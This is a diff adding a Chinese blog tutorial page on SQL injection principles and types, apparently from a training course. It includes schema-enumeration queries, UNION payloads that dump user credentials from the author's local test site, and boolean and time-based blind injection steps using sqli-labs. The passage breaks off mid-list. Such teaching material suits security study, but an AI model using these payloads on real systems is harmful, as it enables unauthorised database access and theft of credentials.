@@ -1,0 +1,1186 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="SQL注入 原理及分类, Evolyutsiya">
+    <meta name="description" content="大致流程1。确定注入类型2。确定注入的数据库，数据库版本号3。根据数据库和数据库版本，进行查库4。查表5。查列6。查数据
+Mysql 数据库查询流程查库select schema_name from information_schema.s">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>SQL注入 原理及分类 | Evolyutsiya</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Evolyutsiya</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Evolyutsiya</div>
+        <div class="logo-desc">
+            
+            不忘初心,方得始终
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Evolyutsiya/Evolyutsiya.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Evolyutsiya/Evolyutsiya.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        SQL注入 原理及分类
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/第七周/" target="_blank">
+                                <span class="chip bg-color">第七周</span>
+                            </a>
+                        
+                            <a href="/tags/SQL注入/" target="_blank">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/i春秋/" class="post-category" target="_blank">
+                                i春秋
+                            </a>
+                        
+                            <a href="/categories/i春秋/SQL注入/" class="post-category" target="_blank">
+                                SQL注入
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-09-01
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        2.9k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        12 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h1><p>1。确定注入类型<br>2。确定注入的数据库，数据库版本号<br>3。根据数据库和数据库版本，进行查库<br>4。查表<br>5。查列<br>6。查数据</p>
+<h2 id="Mysql-数据库查询流程"><a href="#Mysql-数据库查询流程" class="headerlink" title="Mysql 数据库查询流程"></a>Mysql 数据库查询流程</h2><h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><pre><code>select schema_name from information_schema.schemata</code></pre><h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><pre><code>select table_name from information_schema.tables where table_schema=&#39;库名&#39;</code></pre><h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><pre><code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></pre><h3 id="查内容"><a href="#查内容" class="headerlink" title="查内容"></a>查内容</h3><pre><code>select * from 库名.表名
+或
+select 列名 from 库名.表名    等方式都可</code></pre><h2 id="Mssql-数据库查询大致流程"><a href="#Mssql-数据库查询大致流程" class="headerlink" title="Mssql 数据库查询大致流程"></a>Mssql 数据库查询大致流程</h2><h3 id="查库-1"><a href="#查库-1" class="headerlink" title="查库"></a>查库</h3><pre><code>select db_name(n)        n=0 当前库名，n〉0依次遍历库
+或者
+select name from master..sysdatabases   查集合</code></pre><h3 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h3><pre><code>select name from master..sysobjects where xtype=&#39;u&#39;       其中&#39;u&#39;使用用户表 &#39;v&#39;视图  &#39;x&#39;扩展存储过程
+或者
+select table_name from information_schema.tables </code></pre><h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><pre><code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></pre><h3 id="查内容-1"><a href="#查内容-1" class="headerlink" title="查内容"></a>查内容</h3><pre><code>select * from &#39;表名&#39;
+或者
+select &#39;列名&#39; from &#39;表名&#39;</code></pre><h2 id="Mssql-实现limit的三种方式"><a href="#Mssql-实现limit的三种方式" class="headerlink" title="Mssql 实现limit的三种方式"></a>Mssql 实现limit的三种方式</h2><pre><code>1.select top 1 查询内容A from 查询来源 where 查询内容A not in (select top 1 查询内容A from 查询来源 order by 1一般id固定为第一列，如果不是需要猜 desc降序) as b括号内查询内容的别名 asc升序
+2。select top 1 查询内容A from 查询来源 where 查询内容A not in (select top 1序号从0开始，查询内容A from 查询来源)
+3。select top 1 查询内容A from 查询来源 where 查询内容A not in (&#39;查询结果依次填入，直到查询为空&#39;)</code></pre><h2 id="xml-path-‘路径’-的方式，一次性读取多个字段，保存到xml文档中"><a href="#xml-path-‘路径’-的方式，一次性读取多个字段，保存到xml文档中" class="headerlink" title="xml path(‘路径’)的方式，一次性读取多个字段，保存到xml文档中"></a>xml path(‘路径’)的方式，一次性读取多个字段，保存到xml文档中</h2><pre><code>    select table_name from information_schema.tables for xml path(‘’);</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033224249.png" alt><br>这是遍历table_name的结果写入到了xml文档中<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033304307.png" alt><br>或者这样写，将输出结果进行分割</p>
+<pre><code>    select char(127)+table_name from information_schema.tables for xml path(‘’);</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033334781.png" alt></p>
+<h1 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h1><h2 id="按注入类型"><a href="#按注入类型" class="headerlink" title="按注入类型"></a>按注入类型</h2><p>1。数字型注入<br>2。字符串型注入</p>
+<h2 id="按请求方式"><a href="#按请求方式" class="headerlink" title="按请求方式"></a>按请求方式</h2><p>1。GET方式<br>2。POST方式</p>
+<h2 id="按页面反馈"><a href="#按页面反馈" class="headerlink" title="按页面反馈"></a>按页面反馈</h2><p>1。union类型注入<br>2。布尔类型注入<br>3。多语句注入<br>4。内联注入</p>
+<h2 id="按布尔类型"><a href="#按布尔类型" class="headerlink" title="按布尔类型"></a>按布尔类型</h2><p>1。布尔注入<br>2。时间延时注入</p>
+<h2 id="按照数据库类型"><a href="#按照数据库类型" class="headerlink" title="按照数据库类型"></a>按照数据库类型</h2><p>1。MySQL数据库注入<br>2。SQLServer数据库注入<br>3。Oracle数据库注入<br>4。Access数据库注入<br>5。Mongodb数据库注入</p>
+<h1 id="SQL注入漏洞的判断"><a href="#SQL注入漏洞的判断" class="headerlink" title="SQL注入漏洞的判断"></a>SQL注入漏洞的判断</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>SQL语句如果出现问题，会有回显。如果编码隐藏了错误回显，就根据程序执行后显示的不同结果进行判断。当出现不正常显示时，想办法将显示结果正常，如果成功就说明有注入的漏洞。<br>如果错误不能恢复正常则说明没有注入漏洞。</p>
+<h2 id="关于MySQL数据库中information-schema库中的三个表"><a href="#关于MySQL数据库中information-schema库中的三个表" class="headerlink" title="关于MySQL数据库中information_schema库中的三个表"></a>关于MySQL数据库中information_schema库中的三个表</h2><h3 id="columns"><a href="#columns" class="headerlink" title="columns"></a>columns</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062125729.png" alt></p>
+<h3 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062142233.png" alt></p>
+<h3 id="schemata"><a href="#schemata" class="headerlink" title="schemata"></a>schemata</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062154465.png" alt></p>
+<h3 id="大致的选择"><a href="#大致的选择" class="headerlink" title="大致的选择"></a>大致的选择</h3><p>如果只是简单的查询数据库中的表，优先选择schemata<br>如果需要详细查询数据可以选择，columns<br>如果不需要列名的查询，可以选择tables</p>
+<h1 id="SQL注入实际操作"><a href="#SQL注入实际操作" class="headerlink" title="SQL注入实际操作"></a>SQL注入实际操作</h1><h2 id="以自己写的网站为例"><a href="#以自己写的网站为例" class="headerlink" title="以自己写的网站为例"></a>以自己写的网站为例</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062611925.png" alt><br>怀疑有注入点，F12进入hackbar，数字型 -1 验证猜测是否正确<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062625311.png" alt><br>发现新闻页面改变，确定是数字型注入点使用order by 确定列<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062646066.png" alt><br>语法错误，二分法确定列数<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062657006.png" alt><br>确定为6列<br>执行Union联合查询获取数据库信息<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062706069.png" alt><br>确定6、5、3、4列可用</p>
+<pre><code>Union select 1,2,3,version(),database(),user()</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062714597.png" alt></p>
+<pre><code>http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;item&#39;)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062737576.png" alt><br>或者使用database() 代替 ‘item’ 查询<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062748753.png" alt></p>
+<pre><code>或者hex查询 代替使用database()
+http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=0x6974656d) </code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062832815.png" alt></p>
+<pre><code>查列名
+http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;item&#39; and table_name = &#39;users&#39;)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062856052.png" alt></p>
+<pre><code>查数据
+http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(id,0x7e,uname,0x7e,passwd,0x7e,email,0x7e) from item.users)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062912751.png" alt></p>
+<h3 id="单引号注入"><a href="#单引号注入" class="headerlink" title="单引号注入"></a>单引号注入</h3><p>确定6列<br>1234’ and 0 order by 6 #’<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063016778.png" alt></p>
+<pre><code>输出表
+1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;item&#39;)#&#39;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063035581.png" alt></p>
+<pre><code>输出列
+1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;item&#39; and table_name = &#39;users&#39;) #</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063053492.png" alt></p>
+<pre><code>查询数据    
+1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(id,0x7e,uname,0x7e,passwd,0x7e,email,0x7e) from item.users) #</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063109089.png" alt></p>
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>通过true和false判断，变相导出数据库的数据<br>相对而言，需要确定，查询的数据库字符串长度，二分法确定字符串。对于ASCII字符转换成HEX进制二分法即可确定字符。如果是Unicode字符串需要相应的函数转换后使用二分法确定字符串。只是相对ASCII更麻烦而以</p>
+<h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><pre><code>对information_schema数据库进行查询
+select schema_name from information_sechma.schemata limit 0,1    取出第一行的数据</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063517834.png" alt></p>
+<pre><code>计算该数据的长度
+select Length((select schema_name from information_schema.schemata limit 2,1));</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063537401.png" alt></p>
+<pre><code>在注入点盲注二分法猜测字符串长度（注意点：使用盲注查询的顺序可能和数据库控制台查询的顺序不一致）
+http://192.168.100.17/xiangmu/xinwen/yemianzhanshi.php?id=36 and  length((select schema_name from information_schema.schemata limit 1,1))&gt;5—l</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063550078.png" alt></p>
+<pre><code>先取出该字段的第一个字符
+mid((select schema_name from information_schema.schemata limit 1,1),1,1);
+使用ASCII比较获取数据字符串
+ascii(mid((select schema_name from information_schema.schemata limit 1,1),1,1));
+确定该字符ASCII是105    i
+http://192.168.100.17/xiangmu/xinwen/yemianzhanshi.php?id=36 and  
+ascii(mid((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;105
+-- l
+查询第二个字符串ASCII是 116  t
+ascii(mid((select schema_name from information_schema.schemata limit 1,1),2,1))&gt;116
+-- l
+根据后台数据库推出该数据库名为item数据库</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063610924.png" alt></p>
+<h4 id="根据数据库名查询数据库下的表名"><a href="#根据数据库名查询数据库下的表名" class="headerlink" title="根据数据库名查询数据库下的表名"></a>根据数据库名查询数据库下的表名</h4><pre><code>数据库后台的运行代码
+select table_name from information_schema.tables where table_schema=&#39;item&#39;;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063645366.png" alt></p>
+<pre><code>使用SQL盲注
+1．    选择第一行的数据
+    a)    select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1;
+2．    计算第一行数据的长度
+    a)    length((select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1));
+取定字符串长度为7</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063659349.png" alt></p>
+<pre><code>    b)    使用mid截取字符串的第一个字符
+mid((select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1),1,1);
+    c)    使用ascii判断该字符的ascii值
+ascii(mid( (select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1),1,1));
+确定该ASCII字符是112     p
+    d)    依此类推确定该字符串是 pinglun 字符串</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063714893.png" alt></p>
+<h4 id="根据表名确定表内的-列名-信息"><a href="#根据表名确定表内的-列名-信息" class="headerlink" title="根据表名确定表内的 列名 信息"></a>根据表名确定表内的 列名 信息</h4><pre><code>1．    查询列名的语句
+    a)    select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39;;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063809937.png" alt></p>
+<pre><code>    b)    选取第一个计算长度
+length((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1));
+    c)    使用mid函数一次选取字符串
+mid((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1),1,1);
+    d)    使用ascii依次判断字符
+ascii(mid((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1),1,1));
+最终确定该字符串是    pid</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063821821.png" alt></p>
+<h4 id="根据列名信息查询表内的数据"><a href="#根据列名信息查询表内的数据" class="headerlink" title="根据列名信息查询表内的数据"></a>根据列名信息查询表内的数据</h4><pre><code>1．    后台数据库，数据查询
+    a)    select pid from item.pinglun ; 或者查询所有数据 select * from item.pinglun
+        i.    使用concat合并成单列多行（group_concat合并成单列单行）
+    b)    计算第一行的长度
+length((select pid from item.pinglun limit 0,1));
+    c)    使用mid依次获取字符串
+mid((select pid from item.pinglun limit 0,1),1,1);
+    d)    使用ascii函数依次判断字符串
+ascii(mid((select pid from item.pinglun limit 0,1),1,1));
+最后确定该数据是 1</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063856201.png" alt></p>
+<pre><code>至此通过 infromation_schema数据库中columns表中的 
+table_schema  存储的数据库名
+table_name    相应的数据库中的表名
+column_name  相应的数据库中的表名中包含的所有列名
+查询完成对该数据库的结构掌握，依次为依据完成对数据库的盲注。
+    注意：这只适用于mysql5.0版本以上，mongdb有相似的存储结构。</code></pre><h3 id="SQL延时盲注"><a href="#SQL延时盲注" class="headerlink" title="SQL延时盲注"></a>SQL延时盲注</h3><pre><code>下面进行SQL延时盲注的操作，以sqli-labs-master的第九关为例
+1．    首先判断是否存在注入
+    a)    发现，无论是否添加 ‘ 或 “ 都不引起页面的变化，可能不存在注入
+    b)    观察页面猜测很可能是简单语句输出，使用 and sleep(3) 看能否引起睡眠，是否存在时间延时注入</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064024829.png" alt></p>
+<pre><code>    c)    有效则可以确定该处存在 ‘ 时间延时注入
+2．    开始注入操作
+  准备：
+    a)    时间延时注入大体思路和盲注一样，只是对结果的判断从页面的变化该成页面的反应时间。根据页面不同的反应时间判断结果的正确与否，从而导出数据
+    b)    时间延时的函数有两个
+        i.    Sleep()：简单的休眠函数
+        ii.    Benchmark()：重复执行操作，人为的造成页面延时效果
+1.    Eg：benchmark(10000000,md5(1))    根据电脑性能不同会有延时但时间大体一致
+    c)    条件控制有两个：
+        i.    if判断
